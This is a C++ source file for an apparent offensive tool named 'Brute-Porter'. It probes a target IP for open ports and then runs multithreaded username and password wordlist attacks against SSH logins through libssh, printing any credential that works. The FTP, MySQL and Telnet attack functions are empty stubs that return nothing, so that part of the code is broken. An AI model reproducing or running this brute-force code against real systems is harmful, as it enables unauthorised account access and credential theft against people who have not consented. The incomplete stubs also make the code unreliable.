#include <iostream>
#include <fstream>
#include <unistd.h>
#include <vector>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <libssh/libssh.h>
#include <thread>
#include <mutex>
#include <atomic>
#include <atomic>


// Global Variables
int MAX_THREAD;
std::vector<std::thread> threads;
std::atomic<bool> found(false);

// RESET
#define RESET   "\033[0m"

// BOLD + BRIGHT COLORS
#define RED     "\033[1;91m"
#define GREEN   "\033[1;92m"
#define YELLOW  "\033[1;93m"
#define BLUE    "\033[1;94m"
#define CYAN    "\033[1;96m"
#define WHITE   "\033[1;97m"

using namespace std;

bool isHostUp(string ip){

  cout<< CYAN <<"[!] Checking the host os up or down"<<endl;
  vector<int> ports = {21, 22, 23, 25, 53, 80, 110, 139,143, 443, 445, 3306, 3389, 8080};
  
  for(int port:ports){

    int sock = socket(AF_INET,SOCK_STREAM,0);

    if (sock < 0) {
      cerr<<"[-] Error to initialize socket"<<endl;
      return false;
    }

    struct timeval timeout{3,0};
    setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(const void*)&timeout,sizeof(timeout));

    struct sockaddr_in target{};
    target.sin_family = AF_INET;
    target.sin_port = htons(port);

    if (inet_pton(AF_INET,ip.c_str(),&target.sin_addr) <= 0) {
      cerr<< RED << "[!] Invalid ip address"<<endl;
      return false;
    }

    int result = connect(sock,(struct sockaddr*)&target,sizeof(target));
    close(sock);

    if(result == 0){
      return true;
    }

  }

  return false;
}

bool portChecker(string ip,int port){

  int sock = socket(AF_INET,SOCK_STREAM,0);
  if (sock < 0) {
    cerr<< RED << "[-] Error to initialize socket"<<endl;
    return false;
  }

  struct timeval timeout {4,0};
  setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(const void*)&timeout,sizeof(timeout));

  struct sockaddr_in target{};
  target.sin_family = AF_INET;
  target.sin_port = htons(port);
  inet_pton(AF_INET, ip.c_str(), &target.sin_addr);

  int conn = connect(sock, (struct sockaddr*)&target, sizeof(target));
  close(sock);
  return (conn == 0);

}

bool ftpBrute(string username,string password,string ip,int port){
    
}
bool mysqlBrute(string username,string password,string ip,int port){
    
}
bool telnetBrute(string username,string password,string ip,int port){
    
}



bool sshBrute(string username,string password,string ip,int port){

  if (found) return false;

  ssh_session session = ssh_new();
  if (!session) return false;

  ssh_options_set(session,SSH_OPTIONS_HOST,ip.c_str());
  ssh_options_set(session,SSH_OPTIONS_PORT,&port);
  ssh_options_set(session,SSH_OPTIONS_USER,username.c_str());

  int rc = ssh_connect(session);
  if (rc != SSH_OK) {
    cout<<RED <<"[-] Failed to connect with ssh"<<endl;
    ssh_free(session);
    return false;
  }

  rc = ssh_userauth_password(session,nullptr,password.c_str());
  if (rc == SSH_AUTH_SUCCESS) {
    cout <<GREEN << "[+] Success => " << username << ":" << password << endl;
    found = true;
    ssh_disconnect(session);
    ssh_free(session);
    return true;
  }
  ssh_disconnect(session);
  ssh_free(session);
  return false;
}

int banner() {
    system("clear");
    cout << WHITE << "__________________________________________________________________" << endl;
    cout << CYAN << R"(

    dBBBBb dBBBBBb    dBP dBP dBBBBBBP dBBBP     
       dBP     dBP                               
   dBBBK'  dBBBBK   dBP dBP    dBP   dBBP        
  dB' db  dBP  BB  dBP_dBP    dBP   dBP          
 dBBBBP' dBP  dB' dBBBBBP    dBP   dBBBBP        
                                                 
   dBBBBBb  dBBBBP dBBBBBb dBBBBBBP dBBBP dBBBBBb
       dB' dBP.BP      dBP                    dBP
   dBBBP' dBP.BP   dBBBBK   dBP   dBBP    dBBBBK 
  dBP    dBP.BP   dBP  BB  dBP   dBP     dBP  BB 
 dBP    dBBBBP   dBP  dB' dBP   dBBBBP  dBP  dB' 
                                                 

    )" << endl;

    cout << GREEN << "[*] Tool Name : Brute-Porter" << endl;
    cout << GREEN << "[*] Author    : William Steven" << endl;
    cout << GREEN << "[*] GitHub    : https://github.com/Anon-404" << endl;
    cout << GREEN << "[*] Type      : SSH / FTP / MySQL / Telnet Brute-force Tool" << endl;
    cout << WHITE << "__________________________________________________________________" << endl;

    return 0;
}

void bruteWithUserListOnly(string ip, int port,int service) {
    string filename, password, username;
    cout << YELLOW << "[?] Wordlist file path (userlist): ";
    cin >> filename;

    ifstream file(filename);
    if (!file) {
        cout << RED << "[-] Can't open file" << RESET << endl;
        return;
    }

    cout << YELLOW << "[?] Enter password: ";
    cin >> password;

    cout << YELLOW << "\n[?] Max Thread (5-10): ";
    cin >> MAX_THREAD;

    banner();
    cout << BLUE << "[*] " << YELLOW << "Starting Brute-force" << endl;
    cout << BLUE << "[*] " << YELLOW << "Host: " << ip << endl;
    cout << BLUE << "[*] " << YELLOW << "Port: " << port << "\n" << endl;

    string line;
    while (getline(file, username)) {
        if (username.empty()) continue;
        cout << BLUE << "[*]" << WHITE << " Trying " << username << ":" << password << endl;
        if(service == 1){
            threads.emplace_back(sshBrute, username, password, ip, port);
        }else if(service == 2){
            threads.emplace_back(ftpBrute, username, password, ip, port);
        }else if(service == 3){
            threads.emplace_back(mysqlBrute, username, password, ip, port);
        }else if(service == 4){
            threads.emplace_back(telnetBrute, username, password, ip, port);
        }

        if (threads.size() >= MAX_THREAD) {
            for (auto& t : threads) t.join();
            threads.clear();
            if (found) break;
        }
    }

    if (!found.load()) {
        cout << RED << "[-] No valid credential found" << RESET << endl;
    }

    file.close();
}



void bruteWithPassListOnly(string ip, int port,int service) {
    string filename, password, username;
    cout << YELLOW << "[?] Wordlist file path (passlist): ";
    cin >> filename;

    ifstream file(filename);
    if (!file) {
        cout << RED << "[-] Can't open file" << RESET << endl;
        return;
    }

    cout << YELLOW << "[?] Enter username: ";
    cin >> username;

    cout << YELLOW << "\n[?] Max Thread (5-10): ";
    cin >> MAX_THREAD;

    banner();
    cout << BLUE << "[*] " << YELLOW << "Starting Brute-force" << endl;
    cout << BLUE << "[*] " << YELLOW << "Host: " << ip << endl;
    cout << BLUE << "[*] " << YELLOW << "Port: " << port << "\n" << endl;

    while (getline(file, password)) {
        if (password.empty()) continue;
        cout << BLUE << "[*]" << WHITE << " Trying " << username << ":" << password << endl;
        if(service == 1){
            threads.emplace_back(sshBrute, username, password, ip, port);
        }else if(service == 2){
            threads.emplace_back(ftpBrute, username, password, ip, port);
        }else if(service == 3){
            threads.emplace_back(mysqlBrute, username, password, ip, port);
        }else if(service == 4){
            threads.emplace_back(telnetBrute, username, password, ip, port);
        }

        if (threads.size() >= MAX_THREAD) {
            for (auto& t : threads) t.join();
            threads.clear();
            if (found) break;
        }
    }

    if (!found.load()) {
        cout << RED << "[-] No valid credential found" << RESET << endl;
    }

    file.close();
}



void bruteWithUserAndPassList(string ip, int port,int service) {
    string userfile, passfile, username, password;
    cout << YELLOW << "[?] Wordlist file path (userlist): ";
    cin >> userfile;
    cout << YELLOW << "[?] Wordlist file path (passlist): ";
    cin >> passfile;

    ifstream ufile(userfile);
    ifstream pfile(passfile);

    if (!ufile || !pfile) {
        cout << RED << "[-] Can't open one or both files" << RESET << endl;
        return;
    }

    cout << YELLOW << "\n[?] Max Thread (5-10): ";
    cin >> MAX_THREAD;

    banner();
    cout << BLUE << "[*] " << YELLOW << "Starting Brute-force" << endl;
    cout << BLUE << "[*] " << YELLOW << "Host: " << ip << endl;
    cout << BLUE << "[*] " << YELLOW << "Port: " << port << "\n" << endl;

    while (getline(ufile, username)) {
        if (username.empty()) continue;

        pfile.clear();         // rewind file
        pfile.seekg(0);

        while (getline(pfile, password)) {
            if (password.empty()) continue;
            cout << BLUE << "[*]" << WHITE << " Trying " << username << ":" << password << endl;
            if(service == 1){
                threads.emplace_back(sshBrute, username, password, ip, port);
            }else if(service == 2){
                threads.emplace_back(ftpBrute, username, password, ip, port);
            }else if(service == 3){
                threads.emplace_back(mysqlBrute, username, password, ip, port);
            }else if(service == 4){
                threads.emplace_back(telnetBrute, username, password, ip, port);
            }

            if (threads.size() >= MAX_THREAD) {
                for (auto& t : threads) t.join();
                threads.clear();
                if (found) break;
            }
        }

        if (found) break;
    }

    for (auto& t : threads) t.join();

    if (!found.load()) {
        cout << RED << "[-] No valid credential found" << RESET << endl;
    }

    ufile.close();
    pfile.close();
}


int main () {

    banner();

    string ip;
    int port, service;

    cout << YELLOW << "[?] Enter target IP: ";
    cin >> ip;

    if (!isHostUp(ip)) {
        cout << RED << "[-] The host is down" << RESET << endl;
        return 1;
    }
    cout << GREEN << "[+] The host is up" << RESET << endl;

    // Service selection
    cout << CYAN << "\n[!] Choose Target Service\n\n";
    cout << BLUE << "[1] SSH\n";
    cout << BLUE << "[2] FTP\n";
    cout << BLUE << "[3] MySQL\n";
    cout << BLUE << "[4] Telnet\n";
    cout << YELLOW << "\n[?] Enter service option (1-4): ";
    cin >> service;

    if (service < 1 || service > 4) {
        cout << RED << "[-] Invalid service selection!" << RESET << endl;
        return 1;
    }

    // Port Suggestion
    cout << CYAN << "[!] Suggested Ports: ";
    switch(service) {
        case 1: cout << "22"; break;
        case 2: cout << "21, 20"; break;
        case 3: cout << "3306"; break;
        case 4: cout << "23"; break;
    }
    cout << RESET << endl;

    cout << YELLOW << "[?] Enter port number: ";
    cin >> port;

    // Service Name for port check message
    string serviceName;
    switch(service) {
        case 1: serviceName = "SSH"; break;
        case 2: serviceName = "FTP"; break;
        case 3: serviceName = "MySQL"; break;
        case 4: serviceName = "Telnet"; break;
    }

    cout << CYAN << "[!] Checking " << serviceName << " port is open or not..." << RESET << endl;
    if (!portChecker(ip, port)) {
        cout << RED << "[-] Port " << port << " is closed" << RESET << endl;
        return 1;
    } else {
        cout << GREEN << "[+] Port " << port << " is open" << RESET << endl;
    }

    banner();

    int mode;
    cout << CYAN << "\n[!] Mode selection\n\n";
    cout << BLUE << "[1] Username Brute-force\n";
    cout << BLUE << "[2] Password Brute-force\n";
    cout << BLUE << "[3] Both Unknown (Use wordlists)\n";
    cout << YELLOW << "\n[?] Choose brute-force mode (1-3): ";
    cin >> mode;

    if (mode < 1 || mode > 3) {
        cout << RED << "[-] Wrong mode number!" << RESET << endl;
        return 1;
    }

    // Function call based on mode
    if (mode == 1) {
        bruteWithUserListOnly(ip, port, service);
    } else if (mode == 2) {
        bruteWithPassListOnly(ip, port, service);
    } else if (mode == 3) {
        bruteWithUserAndPassList(ip, port, service);
    }

    return 0;
}